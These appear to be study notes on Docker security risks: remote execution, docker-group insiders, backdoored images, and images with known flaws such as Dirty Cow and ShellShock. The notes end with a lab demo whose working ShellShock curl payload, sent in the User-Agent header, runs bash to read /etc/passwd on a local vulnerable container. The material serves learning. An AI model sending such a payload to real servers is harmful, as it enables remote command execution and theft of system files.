**Docker Attack Surface:** 

- Docker comes with a significant amount of Risk with it if not properly used
- this is because Docker requires root privilege to operate. 
-  external Attacker - External user can gain access through Docker remote execution
-  Malicious Insider - Internal users who are part of Docker group can easily gain Docker root access
-  Compromised Containers -  Backdoor images may cause issues too 

**Exploiting Vulnerable Images:**

- Docker images are downloaded from Docekr Hub
- these Docker images can have publicly known vulnerabilities : 
   - Dirty Cow
   - ShellShock : its a vulnerability released in Bash shell
   
These vulnerabilities can easily provide foot hold on your containers and host where Docker is being run. 


Demo:
// Download vulnerable image from Docker hub
docker pull vulnerables/cve-2014-6271

start it: 
docker run --rm -it -p 8080:80 vulnerables/cve-2014-6271

We can run any commands to it, example: cat /etc/passwd
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
http://localhost:8080/cgi-bin/vulnerable
